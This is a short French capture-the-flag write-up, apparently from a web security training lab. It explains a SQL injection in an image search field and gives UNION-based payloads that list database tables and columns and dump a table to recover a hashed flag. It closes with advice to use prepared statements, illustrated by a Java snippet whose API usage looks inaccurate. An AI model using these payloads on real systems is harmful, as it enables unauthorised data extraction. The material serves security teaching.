
#  Explications

  

En inspectant la page : /?page=searchimg

  

Le champ de recherche **id** est sensible aux injections SQL.



Si on entre `1 OR 1=1` comme id on a la liste de toute les images.

    1 OR 1=1 union select null, concat(table_name) from information_schema.tables where table_schema=database()
le nom de la table est list_images

    1 OR 1=1 union select null, concat(column_name) from information_schema.columns where table_schema=database()
On obtient la liste des colonnes de la table list_images(id, url, title, comment).

    1 OR 1=1 union select null, concat(id, url, title, comment) from list_images

On voit que le user avec l'id 5 est le flag.

1928e8083cf461a51303633093573c46
md5 vers texte = albatroz
texte vers sha256 = f2a29020ef3132e01dd61df97fd33ec8d7fcd1388cc9601e7db691d17d4d6188
#  Protection

En préparant ses requêtes

  

Exemple:

```java

String  sql  =  "SELECT * FROM users WHERE email = ?";

  

// Run the query, passing the 'email' parameter value...

ResultSet  results  = stmt.executeQuery(sql, email);

```